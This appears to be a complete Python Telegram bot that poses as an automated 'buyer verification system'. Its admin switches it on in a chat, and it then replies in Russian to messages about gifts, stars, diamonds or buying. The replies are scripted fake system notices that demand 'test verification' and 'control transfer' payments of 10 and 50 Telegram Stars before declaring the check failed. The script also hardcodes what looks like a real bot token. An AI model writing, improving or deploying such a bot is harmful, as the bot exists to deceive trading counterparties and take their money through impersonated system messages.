import logging
from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

BOT_TOKEN = "8456833116:AAEVMXr0raF_0G9G6lZj-lysM6UDQUZFgEY"
ADMIN_ID = 1371708378

TRIGGER_WORDS = ["подарок", "звезды", "звёзды", "гарант", "diamond", "diamonds", "купить"]

STEPS = [
    "🔐 Система проверки активирована. Статус: Покупатель не подтверждён.",
    "⚠️ У вас нет истории сделок. Система запрашивает тестовую верификацию: 10⭐.",
    "⏳ Проверка 1/2… Ожидание подтверждения.",
    "❗ Система пишет: «Недостаточно операций. Требуется контрольный перевод — 50⭐».",
    "❌ Проверка не пройдена. Сделку продолжить нельзя."
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Бот проверки покупателя активирован.")

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.chat_data["verify_mode"] = True
    context.chat_data["step_index"] = 0
    await update.message.reply_text("🟢 Режим проверки включён.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.chat_data["verify_mode"] = False
    context.chat_data["step_index"] = 0
    await update.message.reply_text("🔴 Режим проверки отключён.")

async def auto_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").lower()
    chat_id = update.effective_user.id

    if not context.chat_data.get("verify_mode") or chat_id == ADMIN_ID:
        return

    if any(word in text for word in TRIGGER_WORDS):
        idx = context.chat_data.get("step_index", 0)
        if idx < len(STEPS):
            await update.message.reply_text(STEPS[idx])
            context.chat_data["step_index"] = idx + 1
        else:
            await update.message.reply_text("🟣 Автоматическая проверка завершена.")
            context.chat_data["step_index"] = 0

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("run", run))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, auto_reply))
    app.run_polling()

if __name__ == "__main__":
    main()
